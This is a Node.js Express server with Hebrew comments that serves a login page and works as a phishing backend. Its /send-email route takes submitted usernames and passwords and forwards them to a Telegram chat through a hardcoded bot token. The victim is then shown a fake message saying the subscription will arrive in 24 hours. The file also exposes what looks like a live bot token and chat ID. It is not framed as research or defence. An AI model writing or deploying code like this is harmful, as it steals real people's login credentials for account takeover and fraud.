const express = require('express');
const bodyParser = require('body-parser');
const https = require('https');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

// מאפשר לשרת להציג קבצים כמו תמונות שנמצאים בתיקייה שלך
app.use(express.static(__dirname));

// הגדרות הבוט של טלגרם (הנתונים שלך כבר בפנים)
const TELEGRAM_BOT_TOKEN = '8712536099:AAGnazkihREbhPJsGpgmAXOClVF3LSFneGg';
const TELEGRAM_CHAT_ID = '7519574690';

// אומר לשרת להציג את קובץ ה-index.html כשנכנסים לאתר
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// השרת מקשיב לטופס שנשלח מהאתר ושולח אליך לטלגרם
app.post('/send-email', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    // ניסוח ההודעה שתגיע אליך לטלגרם
    const message = `🔐 תזכורת פרטי התחברות חדשים מהאתר:\n\n👤 שם משתמש: ${username}\n🔑 סיסמה: ${password}`;

    const data = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
    });

    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    // שליחת הבקשה לשרת של טלגרם
    const telegramReq = https.request(options, (telegramRes) => {
        let responseBody = '';
        
        telegramRes.on('data', (chunk) => {
            responseBody += chunk;
        });

        telegramRes.on('end', () => {
            console.log('Telegram response: ' + responseBody);
            res.send('המנוי יתקבל בעוד 24 שעות');
        });
    });

    telegramReq.on('error', (error) => {
        console.error('Telegram Error:', error);
        res.send('שגיאה נסה שוב עוד 24 שעות');
    });

    telegramReq.write(data);
    telegramReq.end();
});

// הפעלת השרת על הפורט של Render או פורט מקומי 3000
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`השרת פעיל בהצלחה בפורט ${PORT}`);
});
